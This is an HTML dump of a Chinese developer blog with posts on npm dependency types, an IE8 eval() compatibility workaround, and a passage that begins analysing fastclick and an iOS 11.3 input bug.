+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="npm-目前支持以下几类依赖包管理："><a href="#npm-目前支持以下几类依赖包管理：" class="headerlink" title="npm 目前支持以下几类依赖包管理："></a><strong>npm</strong> 目前支持以下几类依赖包管理：</h2><ul>
+<li>  dependencies</li>
+<li>  devDependencies</li>
+<li>  peerDependencies</li>
+<li>  optionalDependencies</li>
+<li>  bundledDependencies / bundleDependencies</li>
+</ul>
+<p>如果你想使用哪种依赖管理，那么你可以将它放在package.json中对应的依赖对象中，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;fw2&quot;: &quot;^0.3.2&quot;,</span><br><span class="line">    &quot;grunt&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;webpack&quot;: &quot;^3.6.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;gulp&quot;: &quot;^3.9.1&quot;,</span><br><span class="line">    &quot;hello-else&quot;: &quot;^1.0.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;peerDependencies&quot;: &#123; &#125;,</span><br><span class="line">  &quot;optionalDependencies&quot;: &#123; &#125;,</span><br><span class="line">  &quot;bundledDependencies&quot;: [] </span><br></pre></td></tr></table></figure>
+
+<p>下面我们一一来看：</p>
+<h2 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h2><p>应用依赖，或者叫做业务依赖，这是我们最常用的依赖包管理对象！它用于指定应用依赖的外部包，这些依赖是应用发布后正常执行时所需要的，但不包含测试时或者本地打包时所使用的包。可使用下面的命令来安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install packageName --save</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>dependencies</strong>是一个简单的JSON对象，包含<strong>包名</strong>与<strong>包版本</strong>，其中<strong>包版本</strong>可以是版本号或者URL地址。比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  &quot;dependencies&quot; :&#123; </span><br><span class="line">    &quot;foo&quot; : &quot;1.0.0 - 2.9999.9999&quot;, &#x2F;&#x2F; 指定版本范围</span><br><span class="line">    &quot;bar&quot; : &quot;&gt;&#x3D;1.0.2 &lt;2.1.2&quot;, </span><br><span class="line">    &quot;baz&quot; : &quot;&gt;1.0.2 &lt;&#x3D;2.3.4&quot;, </span><br><span class="line">    &quot;boo&quot; : &quot;2.0.1&quot;, &#x2F;&#x2F; 指定版本</span><br><span class="line">    &quot;qux&quot; : &quot;&lt;1.0.0 || &gt;&#x3D;2.3.1 &lt;2.4.5 || &gt;&#x3D;2.5.2 &lt;3.0.0&quot;, </span><br><span class="line">    &quot;asd&quot; : &quot;http:&#x2F;&#x2F;asdf.com&#x2F;asdf.tar.gz&quot;, &#x2F;&#x2F; 指定包地址</span><br><span class="line">    &quot;til&quot; : &quot;~1.2&quot;,  &#x2F;&#x2F; 最近可用版本</span><br><span class="line">    &quot;elf&quot; : &quot;~1.2.3&quot;, </span><br><span class="line">    &quot;elf&quot; : &quot;^1.2.3&quot;, &#x2F;&#x2F; 兼容版本</span><br><span class="line">    &quot;two&quot; : &quot;2.x&quot;, &#x2F;&#x2F; 2.1、2.2、...、2.9皆可用</span><br><span class="line">    &quot;thr&quot; : &quot;*&quot;,  &#x2F;&#x2F; 任意版本</span><br><span class="line">    &quot;thr2&quot;: &quot;&quot;, &#x2F;&#x2F; 任意版本</span><br><span class="line">    &quot;lat&quot; : &quot;latest&quot;, &#x2F;&#x2F; 当前最新</span><br><span class="line">    &quot;dyl&quot; : &quot;file:..&#x2F;dyl&quot;, &#x2F;&#x2F; 本地地址</span><br><span class="line">    &quot;xyz&quot; : &quot;git+ssh:&#x2F;&#x2F;git@github.com:npm&#x2F;npm.git#v1.0.27&quot;, &#x2F;&#x2F; git 地址</span><br><span class="line">    &quot;fir&quot; : &quot;git+ssh:&#x2F;&#x2F;git@github.com:npm&#x2F;npm#semver:^5.0&quot;,</span><br><span class="line">    &quot;wdy&quot; : &quot;git+https:&#x2F;&#x2F;isaacs@github.com&#x2F;npm&#x2F;npm.git&quot;,</span><br><span class="line">    &quot;xxy&quot; : &quot;git:&#x2F;&#x2F;github.com&#x2F;npm&#x2F;npm.git#v1.0.27&quot;,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="devDependencies"><a href="#devDependencies" class="headerlink" title="devDependencies"></a>devDependencies</h2><p>开发环境依赖，仅次于<strong>dependencies</strong>的使用频率！它的对象定义和<strong>dependencies</strong>一样，只不过它里面的包只用于开发环境，不用于生产环境，这些包通常是单元测试或者打包工具等，例如<strong>gulp, grunt, webpack, moca, coffee</strong>等，可使用以下命令来安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install packageName --save-dev</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>举个栗子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;name&quot;: &quot;ethopia-waza&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;a delightfully fruity coffee varietal&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.2.3&quot;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;coffee-script&quot;: &quot;~1.6.3&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;prepare&quot;: &quot;coffee -o lib&#x2F; -c src&#x2F;waza.coffee&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;main&quot;: &quot;lib&#x2F;waza.js&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>prepare脚本会在发布前运行，因此使用者在编译项目时不用依赖它。在开发模式下，运行npm install, 同时也会执行prepare脚本，开发时可以很容易的测试。</p>
+<blockquote>
+<p>至此，你理解了 <strong>–save</strong>和 <strong>–save-dev</strong>的区别了吗？</p>
+</blockquote>
+<h2 id="peerDependencies"><a href="#peerDependencies" class="headerlink" title="peerDependencies"></a>peerDependencies</h2><p>同等依赖，或者叫同伴依赖，用于指定当前包（也就是你写的包）兼容的宿主版本。如何理解呢？ 试想一下，我们编写一个gulp的插件，而gulp却有多个主版本，我们只想兼容最新的版本，此时就可以用同等依赖（<strong>peerDependencies</strong>）来指定：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;gulp-my-plugin&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;0.0.1&quot;,</span><br><span class="line">  &quot;peerDependencies&quot;: &#123;</span><br><span class="line">    &quot;gulp&quot;: &quot;3.x&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当别人使用我们的插件时，<strong>peerDependencies</strong>就会告诉明确告诉使用方，你需要安装该插件哪个宿主版本。</p>
+<p>通常情况下，我们会在一个项目里使用一个宿主（比如gulp）的很多插件，如果相互之间存在宿主不兼容，在执行<strong>npm install</strong>时，cli会抛出错误信息来告诉我们，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm ERR! peerinvalid The package gulp does not satisfy its siblings&#39; peerDependencies requirements!</span><br><span class="line">npm ERR! peerinvalid Peer gulp-cli-config@0.1.3 wants gulp@~3.1.9</span><br><span class="line">npm ERR! peerinvalid Peer gulp-cli-users@0.1.4 wants gulp@~2.3.0</span><br></pre></td></tr></table></figure>
+
+<p>运行命令<strong>npm install gulp-my-plugin –save-dev</strong>来安装我们插件，我们来看下依赖图谱：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">├── gulp-my-plugin@0.0.1</span><br><span class="line">└── gulp@3.9.1</span><br></pre></td></tr></table></figure>
+
+<p>OK, Nice!</p>
+<blockquote>
+<p>注意，npm 1 与 npm 2 会自动安装同等依赖，npm 3 不再自动安装，会产生警告！手动在package.json文件中添加依赖项可以解决。</p>
+</blockquote>
+<h2 id="optionalDependencies"><a href="#optionalDependencies" class="headerlink" title="optionalDependencies"></a>optionalDependencies</h2><p>可选依赖，如果有一些依赖包即使安装失败，项目仍然能够运行或者希望npm继续运行，就可以使用<strong>optionalDependencies</strong>。另外<strong>optionalDependencies</strong>会覆盖<strong>dependencies</strong>中的同名依赖包，所以不要在两个地方都写。</p>
+<p>举个栗子，可选依赖包就像程序的插件一样，如果存在就执行存在的逻辑，不存在就执行另一个逻辑。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  var foo &#x3D; require(&#39;foo&#39;)</span><br><span class="line">  var fooVersion &#x3D; require(&#39;foo&#x2F;package.json&#39;).version</span><br><span class="line">&#125; catch (er) &#123;</span><br><span class="line">  foo &#x3D; null</span><br><span class="line">&#125;</span><br><span class="line">if ( notGoodFooVersion(fooVersion) ) &#123;</span><br><span class="line">  foo &#x3D; null</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; .. then later in your program ..</span><br><span class="line"> </span><br><span class="line">if (foo) &#123;</span><br><span class="line">  foo.doFooThings()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="bundledDependencies-bundleDependencies"><a href="#bundledDependencies-bundleDependencies" class="headerlink" title="bundledDependencies / bundleDependencies"></a>bundledDependencies / bundleDependencies</h2><p>打包依赖，<strong>bundledDependencies</strong>是一个包含依赖包名的数组对象，在发布时会将这个对象中的包打包到最终的发布包里。如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;fe-weekly&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;ELSE 周刊&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index.js&quot;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;fw2&quot;: &quot;^0.3.2&quot;,</span><br><span class="line">    &quot;grunt&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;webpack&quot;: &quot;^3.6.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;gulp&quot;: &quot;^3.9.1&quot;,</span><br><span class="line">    &quot;hello-else&quot;: &quot;^1.0.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;bundledDependencies&quot;: [</span><br><span class="line">    &quot;fw2&quot;,</span><br><span class="line">    &quot;hello-else&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行打包命令<strong>npm pack</strong>, 在生成的<strong>fe-weekly-1.0.0.tgz</strong>包中，将包含<strong>fw2</strong>和<strong>hello-else</strong>。 但是值得注意的是，这两个包必须先在<strong>devDependencies</strong>或<strong>dependencies</strong>声明过，否则打包会报错。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/eval()%E7%9A%84%E8%BF%90%E7%94%A8%E5%92%8C%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/eval()%E7%9A%84%E8%BF%90%E7%94%A8%E5%92%8C%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">eval()的运用和兼容性问题</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 13:05:54" itemprop="dateModified" datetime="2021-03-10T13:05:54+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="eval-的运用"><a href="#eval-的运用" class="headerlink" title="eval()的运用"></a>eval()的运用</h2><p>eval() 函数可将字符串转换为代码实行，并返回一个或多个值</p>
+<p>eval调用时，实例为eval( “( javascript代码 )” )</p>
+<p>eval()的返回值</p>
+<p>eval()的返回值遵照以下划定规矩：</p>
+<ol>
+<li> 假如eval()的参数不是字符串，那末eval()将直接返回参数。</li>
+<li> 假如eval()的参数是字符串，那末eval()将这个字符串剖析成代码后举行实行，并返回末了一行代码实行的效果。</li>
+<li> 假如字符串没法剖析成正当的代码，eval()将抛出SyntaxError毛病。</li>
+</ol>
+<p>举例1（eval的参数不是字符串）：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-dc4d5e8e42bc6faf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>运转效果（谷歌浏览器测试）：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-70af05064badec1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>举例2（eval的参数是字符串）：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-84320fcb1e2c83b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>运转效果（谷歌浏览器测试）：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-591d433602ba4377.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>固然，假如不运用eval()要领，上面的代码能够运用匿名函数写<br><img src="https://upload-images.jianshu.io/upload_images/10024246-6d61d72a83601c84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>举例3（字符串没法剖析成正当的代码）：<br>[图片上传失败…(image-e61579-1612431403324)] </p>
+<p>运转效果（谷歌浏览器测试）：此时能够看到 谷歌浏览器控制台报错<br><img src="https://upload-images.jianshu.io/upload_images/10024246-70b8a87576a7ba81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h2 id="eval-的兼容性问题"><a href="#eval-的兼容性问题" class="headerlink" title="eval()的兼容性问题"></a>eval()的兼容性问题</h2><p>IE6/7/8不兼容</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-22edc1da1eb8e7f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>运用IE8来测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str &#x3D; &quot;function()&#123;alert(&#39;Test eval&#39;)&#125;&quot;;</span><br><span class="line">var fn &#x3D; eval(&quot;(&quot; + str + &quot;)&quot;);</span><br><span class="line">fn();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>没有弹出框，控制台报错：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-d1ba5b9f2702b160.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<p>解决要领：</p>
+<p>a)var s = “function(){alert(‘Test!’)}”;</p>
+<p>b)var s = “0?0:function(){alert(‘Test!’)}”;<br>固然这个解决要领是从外洋论坛内里找到(网站：<a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/6807649/problems-with-ie9-javascript-eval">http://stackoverflow.com/ques…</a>)<br>[图片上传失败…(image-ee8f60-1612431403324)] </p>
+<p>粗心是：这在JScript诠释器内里是一个bug，它不会出如今IE9除非你运用混淆形式或兼容来看。IE8毛病将这个函数表达式诠释为函数的声明，使得它没有任何的返回值。所以你能够写成其他比较典范的表达式，从从而在JScript诠释器中组成一个表达式。</p>
+<p>那末我们就晓得IE6/7/8运用JScrip诠释器来剖析eval()把参数当初函数声明，没有返回值，所以我么能够把eval()函数内里的字符串代码写成一个表达式，即能够写成：</p>
+<p>function(){alert(‘Test!’)} 或 0?0:function(){alert(‘Test!’)}<br>改代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str &#x3D; &quot;0 ? 0 : function()&#123;alert(&#39;Test eval&#39;)&#125;&quot;;</span><br><span class="line">var fn &#x3D; eval(&quot;(&quot; + str + &quot;)&quot;);</span><br><span class="line">fn();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在IE8内里测试效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-d9debb70a6316c77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<p>末了应用ietester东西测试在IE6也一样没有问题。</p>
+<blockquote>
+<p>原文作者：东雄平<br>    原文地址: <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007394042">https://segmentfault.com/a/1190000007394042</a></p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/fastclick%E8%A7%A3%E6%9E%90%E4%B8%8Eios11-3%E7%9B%B8%E5%85%B3bug%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/fastclick%E8%A7%A3%E6%9E%90%E4%B8%8Eios11-3%E7%9B%B8%E5%85%B3bug%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">fastclick解析与ios11-3相关bug原因分析</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 13:14:04" itemprop="dateModified" datetime="2021-03-10T13:14:04+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>最近发现升级到ios11.3之后，输入框点击变得不灵敏，第二次点击页面中的输入框需要长按一会才能正常唤起键盘输入。排查后，怀疑是fastclick出现了问题，上github看了issues，果不其然很多人也出现相同问题（<a target="_blank" rel="noopener" href="https://github.com/ftlabs/fastclick/issues/548">https://github.com/ftlabs/fas…</a> ）。按照issues上的解决方法，也顺利地解决了问题，不过，究竟为何会出现这么奇怪的bug？我们还需要继续深入寻找答案。</p>
+<h2 id="首先，fastclick究竟用来干嘛？"><a href="#首先，fastclick究竟用来干嘛？" class="headerlink" title="首先，fastclick究竟用来干嘛？"></a>首先，fastclick究竟用来干嘛？</h2><p>简而言之，它是用来<strong>解决300ms延迟</strong>和<strong>点击穿透</strong>这两个问题。<br>在移动设备上点击按钮后，浏览器将会等待300ms，继续监听点击动作来判断是否为双击事件，这就是300ms延迟问题。<br>为了解决这300ms的延迟问题，一种解决方案是将touch系列事件绑定在document上，通过计算touch事件触发的时间位置等来判断是否为移动设备的点击，如zepto.js中自定义的tap事件；另一种方案，也是fastclick中的实现方案，当检测到touchend事件的时候，会通过DOM自定义事件立即出发模拟一个click事件，并用preventDefault阻止300ms之后真正的click事件。</p>
+<p>那么什么是点击穿透问题？<br>点击穿透问题是当两个元素重叠在同一个位置，上层元素绑定touch事件，下层元素绑定click事件，当上层元素触发touch事件后，可能会触发下层div的click事件。</p>
+<h2 id="其次，fastclick都做了哪些工作？"><a href="#其次，fastclick都做了哪些工作？" class="headerlink" title="其次，fastclick都做了哪些工作？"></a>其次，fastclick都做了哪些工作？</h2><p>fastclick的主要工作可见参考文献[2]中的图，如下：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-1599ce6f6c2a7831.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<p>fastclick的主要工作是在body或者顶层元素中绑定touch相关事件，在touch相关事件中标记手势的位置与时间，根据此信息拦截click事件并判断是否模拟触发。</p>
+<p>在处理300ms延迟的过程中，主要工作是模拟并拦截真正的click事件。<br>首先，拦截点击事件的思路是将元素的onclick事件置为空，并用addEventListener重新绑定，理由是onclick将会在fastclick模拟的点击事件之前触发，在构造函数中关键代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function FastClick(layer, options) &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; If a handler is already declared in the element&#39;s onclick attribute, it will be fired before</span><br><span class="line">    &#x2F;&#x2F; FastClick&#39;s onClick handler. Fix this by pulling out the user-defined handler function and</span><br><span class="line">    &#x2F;&#x2F; adding it as listener.</span><br><span class="line">    if (typeof layer.onclick &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;</span><br><span class="line">        oldOnClick &#x3D; layer.onclick;</span><br><span class="line">        layer.addEventListener(&#39;click&#39;, function(event) &#123;</span><br><span class="line">            oldOnClick(event);</span><br><span class="line">        &#125;, false);</span><br><span class="line">        layer.onclick &#x3D; null;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着，看看fastclick如何判断用户的点击事件是真正的点击，在onTouchEnd事件中，判断的关键代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; event.timeStamp为touchend事件的事件，lastClickTime是上一次touchend事件的事件，此处判断是否为双击操作</span><br><span class="line">if ((event.timeStamp - this.lastClickTime) &lt; this.tapDelay) &#123;</span><br><span class="line">    this.cancelNextClick &#x3D; true;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; trackingClickStart是touchstart事件的事件，此处判断是否为长按操作</span><br><span class="line">if ((event.timeStamp - this.trackingClickStart) &gt; this.tapTimeout) &#123;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果此次点击是真正的点击事件，有两种情况要触发模拟的click事件：一种是由needsFocus函数判断是否为可以focus的元素，如<input type="text">、textarea等；另一种是由needsClick函数判断是否为需要原生点击的原生，不需要原生点击的也需要模拟click事件，这部分的代码逻辑比较简单主要根据判断元素的tagName和class来判断，这里就不贴代码了。</p>
+<p>需要触发模拟click事件的情况中，第一种情况（如输入框等）是需要触发focus事件的，触发之后再触发click事件，而第二种（如按钮等）则单纯触发click事件即可。接下来，我们先分析focus事件的响应函数，再看模拟的click事件。<br>focus主要工作一方面在为了将光标移到移到输入框尾部，另一方面触发元素的focus事件，其响应函数为：</p>
